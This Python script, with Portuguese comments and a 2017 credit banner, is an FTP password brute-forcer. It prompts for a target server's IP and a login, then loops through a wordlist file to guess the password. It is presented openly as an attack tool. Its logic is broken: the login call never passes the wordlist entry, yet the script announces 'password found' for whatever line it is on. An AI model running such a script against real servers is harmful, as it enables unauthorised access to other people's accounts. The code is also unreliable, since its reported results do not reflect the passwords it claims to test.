
#!/usr/bin/python

# IMPORTANDO A LIB DO FTP
import ftplib
import time

print('''

 © 2017 COPYRIGHT TODOS OS DIREITOS RESERVADOS POR LOOCK UNDERWOOD')

--------------------------------------------------------------------------------------

 ██████╗ ██████╗ ██╗   ██╗████████╗███████╗              ███████╗████████╗██████╗ 
 ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝              ██╔════╝╚══██╔══╝██╔══██╗
 ██████╔╝██████╔╝██║   ██║   ██║   █████╗      █████╗    █████╗     ██║   ██████╔╝
 ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ╚════╝    ██╔══╝     ██║   ██╔═══╝ 
 ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗              ██║        ██║   ██║     
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝              ╚═╝        ╚═╝   ╚═╝
 
--------------------------------------------------------------------------------------
 X----------------------------------------------------X
 | By: Loock Underwood / Créditos: AnonymousKillerBR1 |
 X----------------------------------------------------X ''')

# PARTE DA CONEXÃO 

try:
    ip = str(input("\n [+] Digite o IP do Alvo FTP: "))
    login_ftp = input("\n [+] Digite o Login do Servidor FTP: ")

    print('\n --------------------------------------------')
    arquivo = open("wordlist.txt", "r")
    for linha in arquivo.readlines():
        try:

            servidor = ftplib.FTP(ip)
            servidor.login (login_ftp)
            print(' --------------------------------------------')
            print("\n [!] Senha Encontrada: % s" % linha)
            print(' --------------------------------------------')
            break
            raise SystemExit
        except ftplib.error_perm:
            print("\n [-] Senha Incorreta:  % s" % linha)
            print('\n --------------------------------------------')
except KeyboardInterrupt:
    print("\n [!] Fim do Programa!")
    
                       
